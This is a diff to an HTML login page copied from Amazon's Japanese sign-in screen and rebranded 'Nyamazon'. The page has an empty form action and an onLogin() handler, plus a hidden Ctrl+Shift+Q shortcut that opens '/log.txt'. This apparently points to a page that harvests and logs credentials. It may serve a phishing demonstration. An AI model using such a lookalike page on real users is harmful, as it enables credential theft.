@@ -22,121 +22,126 @@
         <div class="a-section a-spacing-medium a-text-center"> </a> </div>
       </div>
       <div id="authportal-center-section" class="a-section">
-        <div id="authportal-main-section" class="a-section">
+        <div id="authportal-main-section" class="a-section" >
+          <!--  -->
+          <!-- <div style="display:flex;justify-content: center;"> -->
+          <div style="text-align: center;">
+            <img alt="nyamazon" src="img/nyamazon.png" style="height: 90px;width:270px;">
+          </div>
+          <!--  -->
           <div class="a-section a-spacing-base auth-pagelet-container">
             <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite"
               aria-atomic="true">
-              <div class="a-box-inner a-alert-container">
+              <!-- <div class="a-box-inner a-alert-container">
                 <h4 class="a-alert-heading">続行するには、cookieを有効にしてください</h4><i class="a-icon a-icon-alert"></i>
                 <div class="a-alert-content">
                   <p> <a class="a-link-normal" href="">
                     </a> </p>
+
                 </div>
-              </div>
+              </div> -->
             </div>
           </div>
-          <div class="a-section auth-pagelet-container">
-            <script type="a-state"
-              data-a-state="{&quot;key&quot;:&quot;convert_to_en_digits&quot;}">{"enabled":false}</script>
-            <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
-            <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
-            <!-- show a warning modal dialog when the third party account is connected with Amazon -->
-            <!-- shows an info modal dialog when a test is using Single Page -->
-            <div class="a-section a-spacing-base">
+        </div>
+      </div>
+      <div class="a-section auth-pagelet-container">
+        <!-- <script type="a-state"
+          data-a-state="{&quot;key&quot;:&quot;convert_to_en_digits&quot;}">{"enabled":false}</script> -->
+        <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
+        <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
+        <!-- show a warning modal dialog when the third party account is connected with Amazon -->
+        <!-- shows an info modal dialog when a test is using Single Page -->
+        <div class="a-section a-spacing-base">
+          <div class="a-section">
+            <form name="signIn" method="post" novalidate="" action=""
+              class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="imzaqKcO">
               <div class="a-section">
-                <form name="signIn" method="post" novalidate="" action=""
-                  class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="imzaqKcO">
-                  <div class="a-section">
-                    <div class="a-box">
-                      <div class="a-box-inner a-padding-extra-large">
-                        <h1 class="a-spacing-small"> Nyamazon ログイン </h1> <!-- optional subheading element -->
-                        <div class="a-row a-spacing-base"> <label for="ap_email" class="a-form-label"> Eメールアドレス </label>
-                          <input type="email" maxlength="128" id="ap_email" autocomplete="userid" name="email"
-                            class="a-input-text a-span12 auth-autofocus auth-required-field" aria-required="true">
-                          <div id="auth-email-missing-alert"
-                            class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-base"
-                            role="alert">
-                            <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
-                              <div class="a-alert-content"> メールアドレスまたは携帯電話番号を入力してください </div>
-                            </div>
-                          </div>
-                        </div> <input type="hidden" name="create" value="0">
-                        <div class="a-section a-spacing-large">
-                          <div class="a-row">
-                            <div class="a-column a-span5"> <label for="ap_password" class="a-form-label"> パスワード </label>
-                            </div>
-
-                          </div> <input type="password" maxlength="1024" id="ap_password"
-                            autocomplete="current-password" name="password"
-                            class="a-input-text a-span12 auth-required-field" aria-required="true">
-                          <div id="auth-password-missing-alert"
-                            class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-base"
-                            role="alert">
-                            <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
-                              <div class="a-alert-content"> パスワードは6文字以上の半角英数字で入力してください </div>
-                            </div>
-                          </div>
+                <div class="a-box">
+                  <div class="a-box-inner a-padding-extra-large">
+                    <h1 class="a-spacing-small">  ログイン </h1> <!-- optional subheading element -->
+                    <div class="a-row a-spacing-base"> <label for="ap_email" class="a-form-label"> ユーザID </label>
+                      <input type="email" maxlength="128" id="ap_email" autocomplete="userid" name="email"
+                        class="a-input-text a-span12 auth-autofocus auth-required-field" aria-required="true">
+                      <!-- <div id="auth-email-missing-alert"
+                        class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-base"
+                        role="alert">
+                        <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
+                          <div class="a-alert-content"> メールアドレスまたは携帯電話番号を入力してください </div>
                         </div>
-                        <div class="a-section a-spacing-extra-large"> <span
-                            class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"
-                            id="a-autoid-0"><span class="a-button-inner">
-                              <input id="signInSubmit" class="a-button-input" type="submit"
-                                aria-labelledby="a-autoid-0-announce">
-                              <span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce"> ログイン
-                              </span></span></span>
-
-                          <div class="a-row a-spacing-top-medium">
-                            <div class="a-section a-text-left"> <label for="auth-remember-me" class="a-form-label">
-                                <input type="hidden" name="kmsiWeblabTreatment" value="C" id="kmsi-weblab-treatment">
-
-                              </label> </div>
-                          </div>
+                      </div> -->
+                    </div> <input type="hidden" name="create" value="0">
+                    <div class="a-section a-spacing-large">
+                      <div class="a-row">
+                        <div class="a-column a-span5"> <label for="ap_password" class="a-form-label"> パスワード </label>
                         </div>
-                        <div class="a-divider a-divider-break">
 
-                          <h5 aria-level="5">初めてご利用ですか？</h5>
-                        </div> <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span
-                            class="a-button-inner"><a id="createAccountSubmit" href="" class="a-button-text"> アカウントを作成
-                            </a></span></span>
+                      </div> <input type="password" maxlength="1024" id="ap_password" autocomplete="current-password"
+                        name="password" class="a-input-text a-span12 auth-required-field" aria-required="true">
+                      <!-- <div id="auth-password-missing-alert"
+                        class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-base"
+                        role="alert">
+                        <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
+                          <div class="a-alert-content"> パスワードは6文字以上の半角英数字で入力してください </div>
+                        </div>
+                      </div> -->
+                    </div>
+                    <div class="a-section a-spacing-extra-large"> <span
+                        class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"
+                        id="a-autoid-0"><span class="a-button-inner">
+                          <input id="signInSubmit" class="a-button-input" type="submit"
+                            aria-labelledby="a-autoid-0-announce">
+                          <span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce"> ログイン
+                          </span></span></span>
+
+                      <div class="a-row a-spacing-top-medium">
+                        <div class="a-section a-text-left"> <label for="auth-remember-me" class="a-form-label">
+                            <input type="hidden" name="kmsiWeblabTreatment" value="C" id="kmsi-weblab-treatment">
+
+                          </label> </div>
                       </div>
                     </div>
-                  </div> <input name="metadata1" type="hidden"
-                    value="ECdITeCs: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"><input
-                    type="hidden" name="aaToken"
-                    value="{&quot;uniqueValidationId&quot;:&quot;972ed2ff-980f-45c8-a3c9-b6d78e3ee232&quot;}">
-                </form>
-              </div>
-            </div>
+                    <div class="a-divider a-divider-break">
+
+                      <h5 aria-level="5">初めてご利用ですか？</h5>
+                    </div> <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span
+                        class="a-button-inner"><a id="createAccountSubmit" href="" class="a-button-text"> アカウントを作成
+                        </a></span></span>
+                  </div>
+                </div>
+              </div> 
+            </form>
           </div>
         </div>
       </div>
-      <div id="right-2"> </div>
-      <div>
-        <div>
-          <div class="a-divider-inner"></div>
-        </div>
-        <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
-          <ul>
-            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
-              <a rel="noopener" class="a-link-normal a-nowrap" target="_blank" href="">
-                利用規約 </a> <span class="auth-footer-seperator"></span>
-            </li>
-            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
-              <a rel="noopener" class="a-link-normal a-nowrap" target="_blank" href="">
-                プライバシー規約 </a> <span class="auth-footer-seperator"></span>
-            </li>
-            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a rel="noopener"
-                class="a-link-normal a-nowrap" target="_blank" href=""> ヘルプ </a>
-              <span class="auth-footer-seperator"></span>
-            </li>
-          </ul>
-        </div>
-        <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> © 1996-2025,
-            Nyamazon.com, Inc.or its affiliates </span> </div>
-      </div>
     </div>
+  </div>
+  <div id="right-2"> </div>
+  <div>
+    <div>
+      <div class="a-divider-inner"></div>
+    </div>
+    <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
+      <ul>
+        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
+          <a rel="noopener" class="a-link-normal a-nowrap" target="_blank" href="">
+            利用規約 </a> <span class="auth-footer-seperator"></span>
+        </li>
+        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
+          <a rel="noopener" class="a-link-normal a-nowrap" target="_blank" href="">
+            プライバシー規約 </a> <span class="auth-footer-seperator"></span>
+        </li>
+        <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;"> <a rel="noopener"
+            class="a-link-normal a-nowrap" target="_blank" href=""> ヘルプ </a>
+          <span class="auth-footer-seperator"></span>
+        </li>
+      </ul>
+    </div>
+    <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> © 1996-2025,
+        Nyamazon.com, Inc.or its affiliates </span> </div>
+  </div>
+  </div>
 
-    <div class="auth-external-javascript" data-external-javascripts="" id="auth-external-javascript"> </div>
+  <div class="auth-external-javascript" data-external-javascripts="" id="auth-external-javascript"> </div>
   </div>
   <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
 
@@ -168,11 +173,11 @@
     evt.preventDefault();
     onLogin();
   })
-  
+
   document.addEventListener("keyup", evt => {
     evt.preventDefault();
     if (event.ctrlKey && event.shiftKey && event.key === 'Q') {
-      location.href="/log.txt"
+      location.href = "/log.txt"
     }
   })
 
